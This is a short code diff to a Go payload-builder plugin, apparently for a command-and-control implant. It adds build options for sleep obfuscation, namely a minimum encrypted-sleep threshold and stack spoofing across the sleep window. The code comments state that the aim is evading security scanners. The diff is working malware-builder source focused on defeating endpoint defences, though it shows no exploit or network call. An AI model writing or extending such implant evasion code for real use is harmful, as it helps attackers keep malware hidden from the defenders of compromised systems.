@@ -351,6 +351,24 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		obfBuf.Write(configH)
 		fmt.Fprintf(&obfBuf, "\n/* ---- sleep obfuscation defaults ---- */\n")
 		fmt.Fprintf(&obfBuf, "#define NAX_DEFAULT_SLEEP_OBF   %s\n", sleepObf)
+
+		// P11: encrypted-sleep threshold (ms). Sleeps below skip the P2
+		// mask/protect cycle (FOLIAGE >=1s gate - short jitter sleeps would
+		// just burn VP churn without buying scanner evasion).
+		minSleepSm := "1000"
+		if v, ok := agentCfg["sm_min_sleep_ms"].(float64); ok && v > 0 {
+			minSleepSm = strconv.Itoa(int(v))
+		}
+		fmt.Fprintf(&obfBuf, "#define NAX_SM_MIN_SLEEP_MS     %s\n", minSleepSm)
+
+		// P5: full-wait stack spoof across the whole sleep window (no effect
+		// when the P4 machinery is absent, i.e. defender lane -> SpoofReady=0).
+		waitSpoof := "1"
+		if v, ok := agentCfg["sm_wait_spoof"].(bool); ok && !v {
+			waitSpoof = "0"
+		}
+		fmt.Fprintf(&obfBuf, "#define NAX_SM_WAIT_SPOOF       %s\n", waitSpoof)
+
 		configH = obfBuf.Bytes()
 	}
 
